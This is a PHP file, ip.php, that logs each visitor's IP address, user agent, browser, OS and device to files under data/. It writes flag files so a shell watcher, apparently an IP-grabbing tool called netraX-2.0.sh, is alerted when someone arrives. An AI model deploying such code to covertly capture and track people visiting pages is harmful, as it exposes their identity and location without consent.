<?php
/* ════════════════════════════════════════════════════════════════════
   ip.php — Global visitor capture entry point
   ─────────────────────────────────────────────────────────────────
   Included by template.php (and any page that needs IP logging).
   Now uses userInfo.php for enhanced Cloudflare-compatible IP
   detection, browser/OS/device parsing, and structured logging.
   ════════════════════════════════════════════════════════════════════ */

require_once __DIR__ . '/userInfo.php';

/* ── Central data directory ── */
$data_dir = dirname(__DIR__) . '/data';
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

/* ── Run the full visitor detection pipeline ──────────────────── */
/* Captures IP (CF → XFF → REMOTE_ADDR), browser, OS, device,
   prints to terminal, saves JSON + text logs in data/ folder,
   and writes .flag_visitor for the shell watcher.               */
$visitorInfo = processVisitor($data_dir);

/* ── Preserve legacy variables used elsewhere ────────────────── */
$ipaddress = $visitorInfo['ip'];
$ipv4      = $visitorInfo['ipv4'] ?? '';
$ipv6      = $visitorInfo['ipv6'] ?? '';
$useragent = $visitorInfo['user_agent'] ?: ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
$date      = $visitorInfo['timestamp'] ?: date('Y-m-d H:i:s');

/* ── Legacy ip_logs.txt (kept for backward compat with netraX-2.0.sh catch_ip) ── */
$log_file = $data_dir . '/ip_logs.txt';
$entry    = "[{$date}] IPv4: {$ipv4} | IPv6: {$ipv6} | User-Agent: {$useragent}\n";

$fp = fopen($log_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $entry);
    flock($fp, LOCK_UN);
    fclose($fp);
}

/* ── Signal shell script that a new IP arrived ── */
file_put_contents($data_dir . '/.flag_ip', date('Y-m-d H:i:s'));
